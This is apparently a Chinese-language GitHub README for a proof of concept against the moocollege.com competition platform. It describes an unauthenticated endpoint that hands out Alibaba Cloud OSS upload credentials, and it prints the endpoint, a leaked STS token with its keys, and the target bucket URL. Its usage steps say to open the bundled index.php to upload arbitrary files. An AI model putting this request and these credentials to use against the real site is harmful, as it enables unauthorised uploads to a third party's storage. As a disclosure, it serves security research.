# moocollege-oss-poc
moocollege.com ali oss upload leak poc


摩课云竞赛平台（以下简称平台） 阿里云 oss 系统任意文件上传漏洞 


漏洞存在的问题

1. 平台在获取阿里云oss 系统的sts 上传密钥的时候不经鉴权，也就是说用户在不登陆的情况下也可以获取 sts

POST https://cc.moocollege.com/nodeapi/3.0.1/common/upload/getOssUploadPolicy 
得到如下响应

{"code":20000,"time":1597110562107,"message":null,"data":{"credentials":{"SecurityToken":"CAIS8wF1q6Ft5B2yfSjIr5WEJtPggJxi2JC6UnfyiWofNeFZlZThmDz2IHFMdXFrAu4Ztfk1mWxQ5vgblqF0UIRfTErIcpOLMUzkJEXzDbDasumZsJYi6vT8a0nxZjf/2MjNGZKbKPrWZvaqbX3diyZ32sGUXD6+XlujQ/Lr5Jl8dYZVJH7aCwBLH9BLPABvhdYHPH/KT5aXPwXtn3DbATgD2GM+qxsmsP/vnpbBu0OD0Q2qlLBEnemrfMj4NfsLFYxkTtK40NZxcqf8yyNK43BIjvwn1P0comyZ4YrAWQQNu0XYavC09cZ0NgZ/arcqtA7IZnx4f5cagAFZ3QyAUlJYj/SvxwCUgsmxdHg0ODYL7gOsjHG7RC3KulBXPRJVp7YQ5sH7VRK4HpIH3KkBPMp1rCX4LfLbTOTJ8Wea5+zQ17KbX81thZ/LvMNDf57vqV+ossD0WCxOqpAhtXDuoBpb7rtnyUlNh+gRdUcarrYtBUnYyMbQqyR2Pw==","AccessKeyId":"STS.NV1miTmCCoRQPQCmjJ9nuzQJz","AccessKeySecret":"ADzBspydaPfR3CisrZALKbBYqoNXGqXbG47vqTjGnjuL","Expiration":"2020-08-11T02:49:22Z"}}}

2.平台在上传文件时没有设置 reffer 鉴权 ,导致来自任意域名的用户都可以利用1中的sts将文件上传到 

http://compeition-excute.oss-cn-beijing.aliyuncs.com

3.平台中的文件 设置为公有读取，且不设置reffer 限制 ，导致任意用户都可以直接访问 2中上传的文件 

漏洞利用 ：

解压本项目到任意网址目录下 ， 浏览器访问 index.php 即可上传文件到 http://compeition-excute.oss-cn-beijing.aliyuncs.com


 
